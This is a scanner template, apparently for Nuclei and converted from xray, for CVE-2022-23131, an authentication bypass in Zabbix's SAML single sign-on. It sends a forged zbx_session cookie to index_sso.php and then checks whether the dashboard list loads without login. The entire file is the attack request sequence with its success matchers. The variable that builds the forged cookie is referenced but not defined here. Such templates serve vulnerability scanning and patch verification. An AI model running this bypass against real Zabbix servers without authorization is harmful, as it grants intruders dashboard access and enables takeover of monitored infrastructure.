id: poc-yaml-zabbix-cve-2022-23131-saml-bypass

info:
  name: poc-yaml-zabbix-cve-2022-23131-saml-bypass
  author: Naraku
  severity: critical
  tags: xray-converted,unauth,cve-2022-23131,ct-292688
  reference:
    - https://blog.sonarsource.com/zabbix-case-study-of-unsafe-session-storage
    - https://github.com/trganda/dockerenv/tree/master/vuln/zabbix/CVE-2022-23131

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /index_sso.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: zbx_session={{signedSessionB64Encode}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
  - raw:
      - |
        GET /zabbix.php?action=dashboard.list HTTP/1.1
        Host: {{Hostname}}
        Cookie: zbx_session={{sso_session}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Dashboards</title>"